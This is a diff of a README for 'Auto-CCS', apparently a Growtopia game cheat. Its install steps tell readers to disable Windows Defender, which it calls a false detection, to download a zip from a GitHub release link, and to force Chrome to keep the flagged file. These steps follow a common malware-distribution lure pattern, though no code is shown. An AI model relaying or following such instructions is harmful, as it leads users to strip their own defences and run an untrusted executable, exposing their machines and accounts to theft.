@@ -4,9 +4,13 @@ VT link: https://www.virustotal.com/gui/file/592bb967d78f66bd3842aee95ffe9cfc9ba
 
 ## How to download & install
 1. Turn off windows defender, because Auto-CCS changes Growtopia code and gets detected as a false detection.
+
 2. Simply follow this link: https://github.com/RealGoblinz/gt-auto-ccs/releases/download/main/GT.Auto-CCS.by.RealGoblins.v2.75.zip
+
 3. Download the zip file
+
 4.(If necessary) Do ctrl + J (chrome) and press keep it
+
 5.. Unzip it with WinRar (right click -> extract to...)
 enjoy!
 
